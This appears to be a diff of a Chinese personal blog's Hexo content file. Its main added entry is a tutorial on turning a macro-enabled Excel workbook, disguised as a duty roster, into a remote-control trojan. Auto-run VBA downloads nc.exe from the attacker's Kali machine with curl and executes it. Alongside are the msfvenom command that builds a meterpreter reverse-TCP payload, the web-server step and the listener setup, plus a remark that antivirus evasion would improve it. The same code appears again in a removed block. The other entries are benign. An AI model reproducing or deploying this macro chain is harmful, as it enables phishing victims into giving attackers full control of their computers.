-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    Downloadandopen</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Downloadandopen()</span><br><span class="line">    Dim curlPath As String</span><br><span class="line">    Dim fileURL As String</span><br><span class="line">    Dim downloadedFilePath As String</span><br><span class="line">    Dim command As String</span><br><span class="line">    </span><br><span class="line">    curlPath = "C:\Windows\System32\curl.exe"</span><br><span class="line">    fileURL = "http://192.168.80.128/nc.exe"</span><br><span class="line">    downloadedFilePath = "C:\Users\Administrator\Desktop\nc.exe"</span><br><span class="line">    </span><br><span class="line">    command = curlPath &amp; " -o " &amp; downloadedFilePath &amp; " " &amp; fileURL</span><br><span class="line">    Call Shell(command, vbNormalFocus)</span><br><span class="line"></span><br><span class="line">    Call Shell(downloadedFilePath, vbNormalFocus)</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
-<p>与此同时，在KALI上需要开启监听：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.80.128</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
-<p>这样，当Excel表格在启动时就会自动连接至攻击机，渗透完成。</p>
-<p><img src="https://img.anineg.space/vba6.png" alt=""></p>
-<p>当然，对<code>nc.exe</code>做一下免杀效果会更好，如果以后有机会我会在这里继续更新一下，</p>
-<hr>
-<p>本测试仅作学习原理探究，严禁去做违法的事情！</p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-        <tag>分享会</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PE启动盘的制作</title>
     <url>/2022/03/12/pe/</url>
     <content><![CDATA[<h1>下载制作工具</h1>
@@ -1241,8 +1185,64 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
         <category>学习笔记</category>
       </categories>
       <tags>
-        <tag>分享会</tag>
         <tag>Python</tag>
+        <tag>分享会</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反弹Shell:通过Excel表格进行远控</title>
+    <url>/2023/04/02/officevba/</url>
+    <content><![CDATA[<h1>讲在前面</h1>
+<p>很久没有更新啦，自从12月新冠开始再加上过年和开学考试<s>再加上亿点点的划水</s>，不知不觉就过去这么久了。那么今天刚好开完了社团的分享会，也一起在这里更新一下内容，也算是作为这次分享的记录了。</p>
+<hr>
+<h1>什么是宏？</h1>
+<p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。</p>
+<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。</p>
+<h1>如何利用？</h1>
+<p>我们创建一个启用宏的excel表格，例如<code>值日名单.xlsm</code>。</p>
+<p>点击<code>视图</code>-<code>宏</code>-<code>查看宏</code>，在这里创建一个<code>AutoOpen</code></p>
+<p><img src="https://img.anineg.space/vba2.png" alt=""></p>
+<h2 id="1-弹出计算器">1.弹出计算器</h2>
+<p>在弹出的VBA中，修改为如下代码，点击运行，即可弹出计算器。</p>
+<p><img src="https://img.anineg.space/vba4-1.png" alt=""></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    LaunchCalculator</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub LaunchCalculator()</span><br><span class="line">    Shell "calc"</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
+<p>原理其实就是在shell中输入<code>calc</code>，启动计算器。</p>
+<h3 id="启动Excel时自动执行">启动Excel时自动执行</h3>
+<p>在左侧<code>ThisWorkbook</code>中添加如下代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Private Sub Workbook_Open()</span><br><span class="line">    Call AutoOpen</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://img.anineg.space/vba5.png" alt=""></p>
+<p>可以令excel在启动时自动运行<code>AutoOpen</code></p>
+<h2 id="2-浏览器全屏访问指定网页">2.浏览器全屏访问指定网页</h2>
+<p>以火狐浏览器为例：</p>
+<p>代码如下，其中</p>
+<p><code>firefoxPath</code>是指火狐浏览器的安装路径。</p>
+<p><code>websiteURL</code>是指要打开的网页。</p>
+<p><code>--kiosk</code>是指定浏览器全屏模式启动，也可以修改为<code>-url</code>以普通模式启动。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    OpenWeb</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub OpenWeb()</span><br><span class="line">    Dim firefoxPath As String</span><br><span class="line">    Dim websiteURL As String</span><br><span class="line">    </span><br><span class="line">    firefoxPath = "C:\Program Files\Mozilla Firefox\firefox.exe"</span><br><span class="line">    websiteURL = "https://anineg.space/"</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Call Shell(firefoxPath &amp; " --kiosk " &amp; websiteURL, vbNormalFocus)</span><br><span class="line">End Sub</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="3-利用反弹shell控制">3.利用反弹shell控制</h2>
+<p>在KALI（IP:192.168.80.128） 中生成<code>nc.exe</code>，具体过程不再详细叙述，给出命令行如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line"></span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line">use windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.128 lport=4444 -f exe -o nc.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>现在在<code>/var/www/html</code>路径下有<code>nc.exe</code>文件，我们需要它能够在Windows上被下载，所以我们启动web服务：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start apache2.service</span><br></pre></td></tr></tbody></table></figure>
+<p>如果此时在Windows浏览器中打开：<code>http://192.168.80.128/nc.exe</code> ，文件就可以被下载了。</p>
+<p>回到Excel中，修改代码如下：</p>
+<p>原理同上，就是使用<code>curl</code>帮我们下载文件，然后在cmd中直接运行。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    Downloadandopen</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Downloadandopen()</span><br><span class="line">    Dim curlPath As String</span><br><span class="line">    Dim fileURL As String</span><br><span class="line">    Dim downloadedFilePath As String</span><br><span class="line">    Dim command As String</span><br><span class="line">    </span><br><span class="line">    curlPath = "C:\Windows\System32\curl.exe"</span><br><span class="line">    fileURL = "http://192.168.80.128/nc.exe"</span><br><span class="line">    downloadedFilePath = "C:\Users\Administrator\Desktop\nc.exe"</span><br><span class="line">    </span><br><span class="line">    command = curlPath &amp; " -o " &amp; downloadedFilePath &amp; " " &amp; fileURL</span><br><span class="line">    Call Shell(command, vbNormalFocus)</span><br><span class="line"></span><br><span class="line">    Call Shell(downloadedFilePath, vbNormalFocus)</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
+<p>与此同时，在KALI上需要开启监听：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 192.168.80.128</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
+<p>这样，当Excel表格在启动时就会自动连接至攻击机，渗透完成。</p>
+<p><img src="https://img.anineg.space/vba6.png" alt=""></p>
+<p>当然，对<code>nc.exe</code>做一下免杀效果会更好，如果以后有机会我会在这里继续更新一下，</p>
+<hr>
+<p>本测试仅作学习原理探究，严禁去做违法的事情！</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+        <tag>分享会</tag>
       </tags>
   </entry>
   <entry>
@@ -1450,25 +1450,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       <tags>
         <tag>bilibili</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>《我不是药神》</title>
-    <url>/2022/03/17/wobushiyaoshen/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="666d2179323feb5ec551598dfa620f9d33b63bb1b19f3500446823dea8a9a014">79a8510ad980b24d8ff0ffe9bafb69aa31e2611f27017824642b1b97f26821030d5768d3bab397a2eef0bc9bef1e7ef61ce60a3f5f9301034e0f53e08f8216354d3f8bace8b457c054647f31aaf51152513038b6a2cff455092a768e640b714c33c96045a0b45cc48e682558aa568125d35d6434a3a51e9aed2088e1dde1c9f8f1783456b024c4b18f969688488b8e28bcd797fdd03af9079fd90a6aafb5667f8bccf824571670406f21c45ccb5cc1e47fdbd44b5d7948120df03b74e2d9c9453e3741d3ee454890670de4fdf917e8d72f32f924e799aebb3825fd0c8cc2c150740b19eb4ec53bc65fe929776e7f02622eb1c82d67baa3ed71d5bd4f4c3e067a8aedec73189c14bd616a510346983b14d83142b5759903890555356bdf4e71dd9f143a331c91587c1ef7abebca3fdcc7fb240f7ab6834375362c16e3e10163062d498f81e12b0faa815242b25ecb4df22429266042453aadae9c2a857a55ddf8a62731f6e2932bd22698916064fd08d06a841534b0866d7728247977b22bf205b5b94ad809f7249228f17d880f727967c8a0bd7062727e68f77227ffdafa2558714cb22db74c3850bd99f97c3119a065a03e56b43d56ddc82ba8d02949bd16c71599b673a3cf0e3a7e0c39c7be0184b9f895f5a4daab98ecacc17b6345c7ed805d8137abcb04c29026e95853ef609bef9b1a5169c35b027ce46de901efc555b834c439e78dd9276412cc5b02eadef701fd5db3a62c714bb502eed6645121a64a7d45b3d4164874b5d44defc352c5dc935400fb1966ce54395a4fc24138a2614514d4a94c5443ea358934abc666c829721d9ea38e891a1da25542d5deaeafe55866416a6763fa28ff600fba9a115cc8373ea8daec78cd431dbe847496276e4f4af064e96ab590fc7ba69f044e2573077d9b680ceca7a8004a5e47230f6d04cd7c07280cefbd1b4a48e7ea911909bcc59789c33cf5f9d7abf3a3bc154e354146bc80a419dfcbfccee7ed342f3b2856b465575cf8c266b85d40ef9fed7a2505abc6659643313b363824c2310e8fed8f633b5ba21342576d2be25dddf61ac2c66d52a81eb83f913a17e007d91f38f2d3c9e46c95aa795ee4bbb0f9e8c83db338c05d5c332be29fe250d6c807ab1f4be56df0bb046b92ffb469230ff66696f803085fd9c355a5243984577577220a27e84f41a5e4a81000e65e289513f914cdff9d5e2cb8ee57e71c62cffc36df1b8c0f01e1433ebf9431bea3727ad9cabc537b4ea5cbfd6faee2161f6e6f79cbc06da83fb80971d09703e617af93b01bc8333ef109eff4d198c34a22a45184c988b60ccbcb5a47e9144d1d1c2cf862f7602754eafb1218cfa6980e3de4905dbb03c5e63b7249aaebe28aefde6e51a37897eda29f1c0bef37da797ed2afa710e5d2714cc8258604908588c95b6bf8e3cc1585180fb57e58bd1808d9a5f05abc5f28af1af791018c407d8db26c32f07e60d45532d09343da936078f4e04d2515fbc63b5f1d53bff4cd6f27e81435d0a821b69e7b8914816af1c397edecaf9e3930e56e1f1e632ce517572c73ce64b70f26b63f921e0b6d69788acb054339a743df82e76fafb585f4f7966bb33a2501df5b02831c00d6f49381de41f6bc78632a055b37bb86e2f9bda1319cfc76f8cf95978a2af6cc33176588562f4d2139b16d0ed18226af8f692435ded43069cebd2b0e6654350c06f79bd4ad5520da3ce1a150e7fa0bd950cc63ada79b5a2f4f5db9c270680adf27499e1ad8cee50613b1a06e8d1b86472e11c3ad526ccc6a485722b27e1f1fa022c18e91a4b6ce0ac76da77b496dd9b016dc58a8a29f0045b524ba79b1d010c682ef061121492638b323332a2170e839c241e3206fa33d3210dc55b34ae4926dd22f70419cb4720b6545874b7846c23b60ac5279f83d7cc57dd7a7ed10e8ccb24eb7b8587efd2e3d13ab7456a0813388ecfe80a1936f5b91e3c277e60c7934fc3fe61676cfaaeb25260df3aa2c28f7fd782772212720434ff5e6ece2e6161db0a24785fe469220578561b32863b0e0c9506facf9b4c0205083a9aa382df58acdfafa71de0a84a2d58f8efa637d54e874f23963d088b4b5f59d6a07546fe030a2bc7da9e1da4d6d4fcd4d2cc315cbfe408a78dc82d0b78ae3ca25188b447aa0e8a62d3903b7feaf1421f7191d3a98f6849f8608fe24bacf734c01e949707e99caee6748f537f1d13f57535f75d5cb7a2fe8b5abf7ad210842ecee55ea7d45ed8f8ca7633d8136f93194c9247993e636766cb8e0f003a7f7fc922820acb16d7fbc7e55b776ccd30dfe05fbe1d54a6bf6e283f8556eff4945327b2a8f0afb8d99f4f35327a6fbbfd630db9e9ed20ced7cb0bf2593622e4906b7f6af5a8646037c1beaece1818a561dc16141f784bc14186ff66fce5aba30ccdcef5982cb6ae18d8f00b54aa0b4dee315c95dffae347bd296bb5b5c23b7356b24880aee37bbc9bec86eefaa8734638fb146475d222a13bb3b14b9dfd05da8026bc0e462758685fdacec1e17768cefc168b759abf909aab856e8df0f8368671dcb96401e9c30c8a8456c554a8bce3cf301769b6e5c92923da34b0d8a04f14d2eb0f5bc4372afd50586a25b9f50c1cfabf43dc83a216cb7c47cf9445abb3b30bfa2c25a586381726449e29e206c2468b6ca68cf05d88b1b881e005385cbcd8c9f6d4e8bc0ac0378b898b22004d2576ee1b50f62e2c1f35491db5cf51b8a33db23eb44d4890491222e79a92395e9494a2018a9a9dec978d8ba7fd4be5b06a2bda49ab5c63cade4bd520a22f1482b06e0b1cd213f28a24a29f102ee527a65cba5e58c550fa94701f7d2f7a370bc28ea38318fa1c40c630139e455d7d8d4293945f6703c304468ec9db040c062012c88abef9ea414e6cbc03f528587e38fd599f728878dead5ba09eb046b1043c32ab65e110007e81310c7c70023e018a02551c82776218280f053183222681cbfa52b649fdf16bccb1b0ad52a2b2466c13e5d74c757b6279456e095d15700c454ca1d80d4e53610caee23bc6a0c2e1ea0500d9b657c52da52242cbeec41c54b6326dc0a27ff9fd90890e0052af497016d6dc7db63a7faf124eb412b3e2ec8dadc22ebcecd37fd5c28eb1dbc3e6e38ba3d1c6b00d7c5f12c92934f7caba5fdf68222eaf589506112a82c7a0702b71ef42209f15d358a72cc96e0b01c5f7e3d2b5c4a642ba0cdde80d5514245873df84467a6c36ee889b821d1981dbe802823e2e6ba059de91f3f1df3546aa5aa3756e678ec41670cac78bccb7cf09206a0d937c1d2e4ccc03bf63e9141dde155606eb7241527138dbb477d0ca3f9ec7a9d17cd09def2185a4d8ef1323031c70ab269387f106bf9cf653eceaa5f3d5296db70d0901e7aa2a3d68fc612eb365c75656c00941b55d3a4d45455fac6059002f898a21c7f4b460532dda2bf8eb03e8c16f720e29f1074116a78301f9bbd2a43d274e39f6898ba10758bcbffcee3f661ca3e3c227a6c9b99ddec81437cbdb4187b79ba47495358d45e32ac793ef0953e4dd7e7174eaea19d0eb4fdc4b3c6c9ffe9ce3c1661f91e4ede119a9715f00f9f12e568fab689ab8feb561cbdf0181da05dd11fd5cea4819e6d5b6738ec24cb1d717769e6608aea0a7bc523aef9928ce6a02c03ce766f322b79d477e028e7e8b2a77f7c701f4d839ac7a8d95408461a74cdb4047288ef33148a4355c2629821241bd91c95aa8baa7ced9e6a57a3899fd0d359a2b260b0d83777b8718d0035184c61ebafaa11143675da1cd67890351d5862011c35429c4bf7927548b2f36b1efccad7ad399aac8332164b2ad901a6e9663890449eecab58d147acb6a06d676da278b3a523a951b6b85b2b3f24306dd3b6def987c78e67ecda4f33212fec193d611267749cdde871fc84d059344ecde839338706eafcbf31f640f889c283153c55c1ad7c40055a9f4943edc4a98046d5e6655d329d2969f2d5b7edeb4bacf67c64e4706dbacb3da84d18e25f0552dc268ba34bd23e96f22a1371b58f49fac0bb5770832a82ebb95c9cc762a26714ef45a1805897ea72d44b24573ac89d8cc7e602610d1edc44b0cc1e5d811bca3fba5c6b74d34107fa51fe4c5bba03fda1d7c588425fac6f927c4185b98d76b203a793de4d9168ec2e63d218f968b0e65926ac89c35204eca2801fae023794fa407550ef38d46e81ecfae990ad3adb30d658879445f88b494a4f53ac269c9775ac16340f30e4c15efc46de0fa21c217b8b8168bbb0a1b0aa7f50f0f33a516cfac03f1cb790be05002a11db7f47412ca20cee8df52d9821251441ddaef62db46d217eb37f48d4e5db7c2e1f797003a60419cb4c555e80974a4419c95c368f64d8ae8f5156337900bbd258ada5fffec1914d6aa6aa05cf9ef3248177e24f1568c14d032a5023141e84ef716c6488791b3a90def98f561fde7b9a7908f3bcc3e53bf6b436d48c73d834f48149e2b9ac4cdd24da95354f41a6eed783034e739aef8b8286c49970620d636e6d90c72ac28357a4a780002ac5e96e4abce44577b9533e40095c93cf3cdd566717124ba5a8c84ac5c08f18b8916034dcfed0db6269a74df9282dadec46d0bbe2dde8708ff20db447f04befa705d2e48eb1462d0d82b3dd68f958c15d40a17b1b9cac98d2b3767638551dec3531729edf90b22973fbb15d133d162a2760de9ae1a401563295a85b87c7f24f5ce7ccc94dcfea1b512007ff90fb7e7d6a5ffe12dbd94aa4c8b40237471f53203b5c6112f23bd41de769e514285c29156248538866eacaaa30bb86469e0e3fd56da5d86e097f6704ee54297ce6046e80ccf0323cf450cdaade7e472f6a2ee24af6f974d9b11cb088f35a50f3bab88d4ab64b8f994a9f3d70ca56d49b0024a7c6be799c1a9dfc8e71627530f52ff4d09d5707a75fa3cb1eb4d2cd4ff2a4856c4e06ba798b3f84008e03867d486f314c234bfec92463cc842b822fada1f485d56efa01d514e8806272d455c36fcd87414628473dbaf582ee9d4cd376ef759f30c885679efa1bf54c299db82f7bd860bc2e83e7227f3363a6eabe4449d31249c5fef01e0bc10e703ef20298140b5dd39a2a30d954d5a20ebaa9114af580d8cfc6fba1909db719b5bfe13f83ad0c6d20d7ef94ed755dab8e4550ff7d3237ffb707af42f11256f59890ab5ad2bf6cfa57e4979fb3db0564b13f12fc26785d96e0b138afd14d0b58123287270e6787768adbdd9938adfcb00e4d6f8b49d26d377b449fea51de5d425de1f774901522f235f3e028cc7a73a7d4d09c36524fe47945503073c5bc0477b86a46160a902b0696f4582817e01e0e70e4f622e92d90ca4a4123f9cf48dcfb91d6d2fd7afa940d35f5326d618d1ddb99620dc0bb9823e029028de0ff7d5704ce2a7085419ebb02d3793499d092b207242a1ca674ac2f3974e1d579c7c7261c6972007df6839eba1aabb12055107877912d62a7f7627002b700e154569853862aa6bd43d4f5478be4718fb8612ce90b48692ee1c29ef569ab6b08f4d81905fb8a82415a348b904087cefcab8a880141c33a4320f4653789ac38c55c05628f56eabc5f04db8e64a70488707ddbf5f6c8e0ac9f7ed9ee0b818b6e762b1b1c9b302fb651cf1ef7a64d6bf73937efbe4736372a74175f9845f5922b9e4d04c2186a5ea03dff9cb85907b8c2cc19f55a1253d18536dc779578c84fbd568d55ba9658c2ae6d5f6c590aea67f2c247f3c6a470f4395454bd69bfd8ef83a537b08286ac631e15585cdfbc4eb19809edc5651f16b09dab9556c00ad99e3a26393bb542db8786ceddca2687ae321ed721854c1ebb23567f5824b25fcab6cc4e4e48cbb23e61d4e9e29be4cc6a93dd665103553e4dd304005045635c044e8803617a88a19f14be8f7d420fbe0feea1b7f43ecd721d7b9e7779f4fc434bed7b03cd9119bfe79e06a1698d0644a5e5ae44cf3e1023f352cef7d4e5f5330429c8241d32ee22130c9ee1e3715a3e5d58f3950c9f379cef0d0d69c9837688914334ef892346a0f58b132f628c4df86507af6bec6547e810bfdcb98c98e4f211f0ceb3a6f094b33d4d644b6623b39dc06d82a2effe78d2957a43f4cdec02c145f7c3b97ec870c6dc228e86b45db46e26c2590e59d64d14d27a85be8221a87da0b4f0273952a214db0333112fd7b5242954e89f1cfbb1aff46786e87e1bd7e3d185283bd103da9e473d559784fbafc3034ec46b872e5980fe4bc19344628d89859479a000a23775cb041aade2da0f25370c70bc449629a608f2a251d1d0751c7b3be73854ff</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-up">
-      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>随手记</category>
-      </categories>
   </entry>
   <entry>
     <title>CTF隐写术(图片隐写)</title>
@@ -1684,69 +1665,23 @@ PNG图片文件结构：</p>
       </tags>
   </entry>
   <entry>
-    <title>搭建几乎0成本的个人网盘</title>
-    <url>/2022/11/20/yunpan/</url>
-    <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
-<p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<s>并不需要担心你的资源会被河蟹</s>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
-<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
-<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
-<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<s>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</s>并不多。</p>
-<h1>搭建网盘</h1>
-<h2 id="准备工作">准备工作</h2>
-<ul>
-<li>一台能上网的电脑</li>
-<li>一个GitHub账号</li>
-<li>一个Vercel账号</li>
-<li>一个Onedrive账号</li>
-</ul>
-<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
-<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
-<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
-<p>当然，拿它来当图床，我想也是很不错的。</p>
-<h1>ANINEGの网盘</h1>
-<p>最后，放上我的网盘来给大家参考一下：</p>
-<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
-<p>网盘链接：</p>
-<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
-]]></content>
+    <title>《我不是药神》</title>
+    <url>/2022/03/17/wobushiyaoshen/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
